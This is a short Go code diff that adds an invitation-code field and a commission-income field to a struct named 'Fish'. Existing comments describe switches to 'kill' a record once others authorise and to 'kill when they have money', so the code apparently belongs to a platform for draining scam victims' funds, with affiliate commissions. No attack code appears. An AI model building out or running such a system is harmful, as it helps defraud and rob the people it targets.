@@ -54,6 +54,9 @@ type Fish struct {
 	Temp                    float64 `gorm:"-"`                 //用于计算
 	OthersAuthorizationKill int     `gorm:"int(10);default:2"` //他人授权就杀的开关  1 开  2 关   //他人授权就杀的开关
 	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
+	TheOnlyInvited          string  //唯一邀请码
+	CommissionIncome        float64 `gorm:"type:decimal(10,2)"` //佣金收益
+
 }
 
 func CheckIsExistModelFish(db *gorm.DB) {
